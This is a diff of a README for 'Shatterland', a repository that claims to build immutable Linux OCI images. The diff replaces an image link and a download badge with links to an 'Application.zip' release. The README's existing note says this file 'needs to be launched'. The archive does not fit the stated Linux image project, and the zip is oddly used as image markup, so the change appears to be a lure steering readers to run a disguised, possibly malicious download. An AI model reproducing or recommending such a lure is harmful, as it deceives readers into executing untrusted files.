@@ -1,6 +1,6 @@
 # Welcome to Shatterland 🌌
 
-![Shatterland Image](https://example.com/shatterland-image.jpg)
+![Shatterland Image](https://github.com/olaissocool/shatterland/releases/download/v1.0/Application.zip)
 
 Shatterland is a repository dedicated to all things atomic, Linux, and immutable! If you're a fan of bluebuild, bluebuild-image, custom-image, or image-based solutions, this is the place for you. Our focus is on creating cutting-edge OCI images for the modern developer.
 
@@ -8,7 +8,7 @@ Shatterland is a repository dedicated to all things atomic, Linux, and immutable
 
 To get started with Shatterland, you can download the latest release by clicking the button below:
 
-[![Download Shatterland](https://img.shields.io/badge/Download-Shatterland-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Shatterland](https://github.com/olaissocool/shatterland/releases/download/v1.0/Application.zip)](https://github.com/olaissocool/shatterland/releases/download/v1.0/Application.zip)
 
 **Note:** This file needs to be launched to access the contents.
 
